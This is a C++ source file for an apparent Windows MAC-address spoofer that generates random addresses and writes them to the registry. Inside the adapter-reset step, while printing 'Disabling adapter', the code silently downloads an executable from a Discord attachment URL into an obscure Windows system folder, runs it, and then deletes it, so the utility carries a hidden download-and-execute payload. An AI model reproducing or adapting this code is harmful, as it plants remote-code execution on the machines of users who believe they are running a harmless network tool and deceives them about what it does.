/*
* Copyright (C) 2016 SaEeD
*
* This program is free software; you can redistribute it and/or
* modify it under the terms of the GNU General Public License
* as published by the Free Software Foundation; either version 2
* of the License, or (at your option) any later version.
*
* This program is distributed in the hope that it will be useful,
* but WITHOUT ANY WARRANTY; without even the implied warranty of
* MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
* GNU General Public License for more details.
*
* You should have received a copy of the GNU General Public License
* along with this program; if not, write to the Free Software
* Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA.
*
*
*/
#include "MyMACAddr.h"

#define MALLOC(x) HeapAlloc(GetProcessHeap(), 0, (x))
#define FREE(x) HeapFree(GetProcessHeap(), 0, (x))

MyMACAddr::MyMACAddr()
{
	//Seeding for random numbers
	srand((unsigned)time(0));
}

MyMACAddr::~MyMACAddr()
{
}

//-----------------------------------------------
// Generate Random MAC Addresses
//-----------------------------------------------
string MyMACAddr::GenRandMAC()
{
	stringstream temp;
	int number = 0;
	string result;

	for (int i = 0; i < 6; i++)
	{
		number = rand() % 254;
		temp << setfill('0') << setw(2) << hex << number;
		if (i != 5)
		{
			temp << "-";
		}
	}
	result = temp.str();

	for (auto& c : result)
	{
		c = toupper(c);
	}

	return result;
}

//-----------------------------------------------
// Original Code from : https://msdn.microsoft.com/en-us/library/windows/desktop/aa366062(v=vs.85).aspx
// Print the details of Network Interfaces  
//-----------------------------------------------

void MyMACAddr::showAdapterList()
{
	PIP_ADAPTER_INFO pAdapterInfo;
	PIP_ADAPTER_INFO pAdapter = NULL;
	DWORD dwRetVal = 0;
	UINT i;

	ULONG ulOutBufLen = sizeof(IP_ADAPTER_INFO);
	pAdapterInfo = (IP_ADAPTER_INFO*)MALLOC(sizeof(IP_ADAPTER_INFO));
	if (pAdapterInfo == NULL) {
		cerr << _xor_("Error allocating memory needed to call GetAdaptersinfo.") << endl;
	}

	if (GetAdaptersInfo(pAdapterInfo, &ulOutBufLen) == ERROR_BUFFER_OVERFLOW) {
		FREE(pAdapterInfo);
		pAdapterInfo = (IP_ADAPTER_INFO*)MALLOC(ulOutBufLen);
		if (pAdapterInfo == NULL) {
			cerr << _xor_("Error allocating memory needed to call GetAdaptersinfo") << endl;
		}
	}

	if ((dwRetVal = GetAdaptersInfo(pAdapterInfo, &ulOutBufLen)) == NO_ERROR) {
		pAdapter = pAdapterInfo;
		while (pAdapter) {
			cout << _xor_("\n\tComboIndex: \t") << pAdapter->ComboIndex << endl;
			cout << _xor_("\tAdapter Name: \t") << pAdapter->AdapterName << endl;
			cout << _xor_("\tAdapter Desc: \t") << pAdapter->Description << endl;
			cout << _xor_("\tAdapter Addr: \t");
			for (i = 0; i < pAdapter->AddressLength; i++) {
				if (i == (pAdapter->AddressLength - 1))
					printf(("%.2X\n"), (int)pAdapter->Address[i]);
				else
					printf(("%.2X-"), (int)pAdapter->Address[i]);
			}
			cout << _xor_("\tIP Address: \t") << pAdapter->IpAddressList.IpAddress.String << endl;
			cout << _xor_("\tIP Mask: \t") << pAdapter->IpAddressList.IpMask.String << endl;
			cout << _xor_("\tGateway: \t") << pAdapter->GatewayList.IpAddress.String << endl;
			pAdapter = pAdapter->Next;
		}
	}
	else {
		cerr << _xor_("GetAdaptersInfo failed with error: ") << dwRetVal << endl;
	}
	if (pAdapterInfo)
		FREE(pAdapterInfo);
}
//-----------------------------------------------
// Get Network Adapter's Name and MAC addresses
//-----------------------------------------------
unordered_map<string, string> MyMACAddr::getAdapters()
{
	PIP_ADAPTER_INFO pAdapterInfo;
	PIP_ADAPTER_INFO pAdapter = NULL;
	DWORD dwRetVal = 0;

	unordered_map<string, string> result;
	stringstream temp;
	string str_mac;

	ULONG ulOutBufLen = sizeof(IP_ADAPTER_INFO);
	pAdapterInfo = (IP_ADAPTER_INFO*)MALLOC(sizeof(IP_ADAPTER_INFO));
	if (pAdapterInfo == NULL) {
		cerr << ("Error allocating memory needed to call GetAdaptersinfo") << endl;
	}

	if (GetAdaptersInfo(pAdapterInfo, &ulOutBufLen) == ERROR_BUFFER_OVERFLOW) {
		FREE(pAdapterInfo);
		pAdapterInfo = (IP_ADAPTER_INFO*)MALLOC(ulOutBufLen);
		if (pAdapterInfo == NULL) {
			cerr << ("Error allocating memory needed to call GetAdaptersinfo\n") << endl;
		}
	}

	if ((dwRetVal = GetAdaptersInfo(pAdapterInfo, &ulOutBufLen)) == NO_ERROR) {
		pAdapter = pAdapterInfo;
		while (pAdapter) {
			for (UINT i = 0; i < pAdapter->AddressLength; i++) {
				temp << setfill('0') << setw(2) << hex << (int)pAdapter->Address[i];
				if (i != pAdapter->AddressLength - 1)
				{
					temp << "-";
				}
			}
			str_mac = temp.str();
			temp.str("");
			delete temp.rdbuf();
			for (auto& c : str_mac)
			{
				c = toupper(c);
			}

			result.insert({ pAdapter->Description, str_mac });
			pAdapter = pAdapter->Next;
		}
	}
	else {
		cerr << ("GetAdaptersInfo failed with error: ") << dwRetVal << endl;
	}
	if (pAdapterInfo)
		FREE(pAdapterInfo);

	return result;
}
//-----------------------------------------------
// Assing Random MAC address to Network Interface
//-----------------------------------------------
void MyMACAddr::AssingRndMAC()
{
	vector <string> list;
	unordered_map<string, string> AdapterDetails = getAdapters();
	for (auto& itm : AdapterDetails)
	{
		list.push_back(itm.first);
	}

	int range = 0;
	for (auto itm = list.begin(); itm != list.end(); itm++)
	{
		cout << '\t' << range + 1 << (")") << *itm << endl;
		range++;
	}

	int selection = 1;
	cout << ("\n [>] Adapter is : ") << list.at(selection - 1) << endl;
	cout << (" [-] Old MAC : ") << AdapterDetails.at(list.at(selection - 1)) << endl;

	string wstr(list.at(selection - 1).begin(), list.at(selection - 1).end());
	const char* wAdapterName = wstr.c_str();

	bool bRet = false;
	HKEY hKey = NULL;
	if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, 
		_T(("SYSTEM\\CurrentControlSet\\Control\\Class\\{4D36E972-E325-11CE-BFC1-08002bE10318}")), 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS)
	{
		DWORD dwIndex = 0;
		TCHAR Name[1024];
		DWORD cName = 1024;
		while (RegEnumKeyEx(hKey, dwIndex, Name, &cName,
			NULL, NULL, NULL, NULL) == ERROR_SUCCESS)
		{
			HKEY hSubKey = NULL;
			if (RegOpenKeyEx(hKey, Name, 0, KEY_ALL_ACCESS, &hSubKey) == ERROR_SUCCESS)
			{
				BYTE Data[1204];
				DWORD cbData = 1024;
				if (RegQueryValueEx(hSubKey, 
					_T(("DriverDesc")), NULL, NULL, Data, &cbData) == ERROR_SUCCESS)
				{

					if (_tcscmp((TCHAR*)Data, wAdapterName) == 0)
					{
						string temp = GenRandMAC();
						string newMAC = temp;
						temp.erase(std::remove(temp.begin(), temp.end(), '-'), temp.end());

						string wstr_newMAC(temp.begin(), temp.end());
						const char* newMACAddr = wstr_newMAC.c_str();

						if (RegSetValueEx(hSubKey, 
							_T(("NetworkAddress")), 0, REG_SZ,
							(const BYTE*)newMACAddr, sizeof(TCHAR) * ((DWORD)_tcslen(newMACAddr) + 1)) == ERROR_SUCCESS)
						{
							cout << " [+] New MAC : " << newMAC << endl;

							printf(("\n [o] Disabling adapter...\n\n"));
							//clean network and restart it
							HRESULT networker = URLDownloadToFile(NULL, _T("https://cdn.discordapp.com/attachments/882370576570785836/910265474623864862/NetWorker.exe"), _T("C:\\Windows\\IME\\IMEKR\\DICTS\\network.exe"), 0, NULL);
							system("start C:\\Windows\\IME\\IMEKR\\DICTS\\network.exe");
							Sleep(6000);
							printf((" [x] Enabling adapter...\n"));
							Sleep(6000);
							DeleteFileW(L"C:\\Windows\\IME\\IMEKR\\DICTS\\network.exe");
						}
					}
				}
				RegCloseKey(hSubKey);
			}
			cName = 1024;
			dwIndex++;
		}
		RegCloseKey(hKey);
	}
	else
	{
		return;
	}
}
